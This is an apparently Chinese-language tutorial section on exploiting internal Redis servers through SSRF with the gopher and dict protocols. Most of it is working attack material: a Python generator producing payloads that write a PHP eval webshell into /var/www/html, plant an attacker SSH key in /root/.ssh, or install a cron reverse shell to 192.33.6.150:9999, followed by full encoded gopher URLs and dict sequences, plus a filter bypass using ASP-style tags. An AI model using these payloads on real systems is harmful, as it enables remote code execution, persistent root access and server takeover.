**ssrf+redis常规攻击**
由于gopher协议可以传输redis的数据报文，也就可以达到类似之前对redis的连接、设置、存储等一系列操作。在这种情况下ssrf+gopher(dict)即可对内网redis等应用进行一定程度上的攻击，一些常见的操作如下：有关每部分具体分析见上面相关部分的详细分析
借鉴@七友师傅脚本处理思路，编写集成几种常规利用方式的payload处理（后续其它手段亦可添加）
    # -*- coding: utf-8 -*-    """
     @Author: Qftm
     @Data  : 2020/8/12
     @Time  : 10:31
     @IDE   : IntelliJ IDEA
    """
    import urllib
    protocol = "gopher://"
    ip = "127.0.0.1"
    port = "6379"
    passwd = ""
    payload = protocol + ip + ":" + port + "/_"
    def redis_resp_format(arr):
        CRLF = "\r\n"
        redis_arr = arr.split(" ")
        cmd = ""
        cmd += "*"+str(len(redis_arr))
        for x in redis_arr:
            cmd += CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
        cmd += CRLF
        return cmd
    if __name__ == "__main__":
        print("##################### SSRF+Gopher->Redis Mode Choice #####################")
        print("#")
        print("# Mode 1：写入 Webshell For Web Service -> Effective dir")
        print("#")
        print("# Mode 2：写入 SSH Public Key For Linux OS -> /root/.ssh/")
        print("#")
        print("# Mode 3：写入 定时任务 For CentOS -> /var/spool/cron/")
        print("#")
        print("# Mode N：待添加 +++++++++++")
        print("#")
        print("##################### SSRF+Gopher->Redis Mode Choice #####################")
        try:
            mode = input("Choice Mode：")
            mode = int(mode)
            if mode == 1:
                shell = "\n\n\n\n"
                dbfilename = "test.php"
                dir = "/var/www/html/"
                # 标志位'${IFS}'替换某部分空格，避免后续命令的分割出现问题
                cmd = ["flushall",
                       "set x {}".format(shell.replace(" ","${IFS}")),
                       "config set dir {}".format(dir),
                       "config set dbfilename {}".format(dbfilename),
                       "save",
                       "quit"
                       ]
                if passwd:
                    cmd.insert(0,"AUTH {}".format(passwd))
                for x in cmd:
                    payload += urllib.request.quote(redis_resp_format(x))
                print(payload)
            elif mode == 2:
                ssh_key_pub = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC+9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE+vjhCTQSYPJahin/s/a+IYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r+WxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP+AOv0wFwL9G8/glZEnGB root@rose\n\n"
                dbfilename = "authorized_keys"
                dir = "/root/.ssh/"
                # 标志位'${IFS}'替换某部分空格，避免后续命令的分割出现问题
                cmd=["flushall",
                     "set x {}".format(ssh_key_pub.replace(" ","${IFS}")),
                     "config set dir {}".format(dir),
                     "config set dbfilename {}".format(dbfilename),
                     "save",
                     "quit"
                     ]
                if passwd:
                    cmd.insert(0,"AUTH {}".format(passwd))
                for x in cmd:
                    payload += urllib.request.quote(redis_resp_format(x))
                print(payload)
            elif mode == 3:
                crontab = "\n\n*/1 * * * * bash -i >& /dev/tcp/192.33.6.150/9999 0>&1\n\n"
                dbfilename = "root"
                dir = "/var/spool/cron/"
                # 标志位'${IFS}'替换某部分空格，避免后续命令的分割出现问题
                cmd = ["flushall",
                       "set x {}".format(crontab.replace(" ","${IFS}")),
                       "config set dir {}".format(dir),
                       "config set dbfilename {}".format(dbfilename),
                       "save",
                       "quit"
                       ]
                if passwd:
                    cmd.insert(0,"AUTH {}".format(passwd))
                for x in cmd:
                    payload += urllib.request.quote(redis_resp_format(x))
                print(payload)
        except Exception as e:
            print(e)
**写入Webshell**
**（1）Gopher协议利用**
  * 原始payload
    flushall
    set x ''
    config set dir /var/www/html/
    config set dbfilename test.php
    save
    quit
  * resp数据格式转换
    ##################### SSRF+Gopher->Redis Mode Choice #####################
    #
    # Mode 1：写入 Webshell For Web Service -> Effective dir
    #
    # Mode 2：写入 SSH Public Key For Linux OS -> /root/.ssh/
    #
    # Mode 3：写入 定时任务 For CentOS -> /var/spool/cron/
    #
    # Mode N：待添加 +++++++++++
    #
    ##################### SSRF+Gopher->Redis Mode Choice #####################
    Choice Mode：1
    gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0Ax%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22qftm%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/var/www/html/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%248%0D%0Atest.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A
    Process finished with exit code 0
  * 二次编码：服务端默认会对gopher数据进行一次url解码
    gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250Ax%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522qftm%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252414%250D%250A%2Fvar%2Fwww%2Fhtml%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25248%250D%250Atest.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A
  * 攻击效果
**（2）Dict协议利用**
这里除了使用gopher协议利用外，同样也可以使用dict协议进行攻击利用，该协议不仅仅限于内网刺探，具体攻击手段如下【区别只是前者支持多行数据传输后者仅支持单行】
  * 组合payload
    dict://127.0.0.1:6379/flushall
    dict://127.0.0.1:6379/set:x:''
    dict://127.0.0.1:6379/config:set:dir:/var/www/html/
    dict://127.0.0.1:6379/config:set:dbfilename:test.php
    dict://127.0.0.1:6379/save
  * 问题探索
利用组合payload攻击，但是会发现其中一条指令执行报错：`set:x:''`，报错信息为：`-ERR
Protocol error: unbalanced quotes in request`
经测试发现是因为其中的一个特殊字符而导致的致命报错，该字符就是：`?`，测试过程如下
     → Qftm :~/Desktop# curl dict://192.33.6.150:9999/'aaa?bbb'
    ^C
     → Qftm :~/Desktop# 
     → Qftm :~/Desktop# nc -lvp 9999
    listening on [any] 9999 ...
    192.33.6.150: inverse host lookup failed: Unknown host
    connect to [192.33.6.150] from (UNKNOWN) [192.33.6.150] 48714
    CLIENT libcurl 7.67.0
    aaa
    QUIT
     → Qftm :~/Desktop#
可以看到字符`?`中起到了截断作用，这里是否可以考虑将其编码呢，答案是：编码无法解决本质问题，因为如果进行一次编码的话服务端默认解码一次，导致dict协议还是无法规避字符`?`，那么编码两次呢，这种肯定是可以规避dict协议的，但是编码两次之后dict协议传入redis执行的命令其中就包含了剩余的一次编码，导致存储的恶意payload关键部分存在编码程序无法解析
一次编码问题验证
    # 发送请求
    ?url=dict://127.0.0.1:6379/set:x:%27%3C%3Fphp:eval($_GET[%22qftm%22]);%3F%3E%27
    # 响应
    -ERR Protocol error: unbalanced quotes in request
二次编码问题验证
    # 发送请求
    ?url=dict://127.0.0.1:6379/set:x:%27%3C%253Fphp:eval($_GET[%22qftm%22]);%253F%3E%27
    # 响应【这里：第一个OK代表set指令成功执行、第二个OK代表dict协议执行完毕的quit退出指令】
    +OK
    +OK
    # 查询二次编码payload存储的数据情况 
    ?url=dict://127.0.0.1:6379/get%20x
    # 响应【可以看到字符`?`被编码】
    $32
    +OK
从上述实践可以看出来字符`？`无法逃逸解析。
  * Bypass
考虑到，常规写入php文件以及短标签方式都被限制，因为他们其中都有字符`?`的存在，那么还有什么办法可以利用`dict`手段写入恶意php程序文件嘛，答案是有的，这里经过探索发现可以使用``和`ASP`两种代码程序标签格式进行绕过，具体探索分析过程如下
利用条件：
    php version  tags.
    ; http://php.net/asp-tags
    asp_tags = Off
这里如果目标站点开启asp标签支持，则可利用payload如下
    dict://127.0.0.1:6379/flushall
    dict://127.0.0.1:6379/set:x:''
    dict://127.0.0.1:6379/config:set:dir:/var/www/html/
    dict://127.0.0.1:6379/config:set:dbfilename:test.php
    dict://127.0.0.1:6379/save
测试效果
    # 请求（某个特殊payload）
    ?url=dict://127.0.0.1:6379/set:x:''
    # 响应
    +OK 
    +OK 
    # 查询
    ?url=dict://127.0.0.1:6379/get:x
    # 响应
    $27
    +OK
对于``标签来说默认生效和php短标签配置没有关系也没有什么其它限制
可利用payload如下
    dict://127.0.0.1:6379/flushall
    dict://127.0.0.1:6379/set:x:''
    dict://127.0.0.1:6379/config:set:dir:/var/www/html/
    dict://127.0.0.1:6379/config:set:dbfilename:test.php
    dict://127.0.0.1:6379/save
测试效果
    # 请求（某个特殊payload）
    ?url=dict://127.0.0.1:6379/set:x:''
    # 响应
    +OK 
    +OK 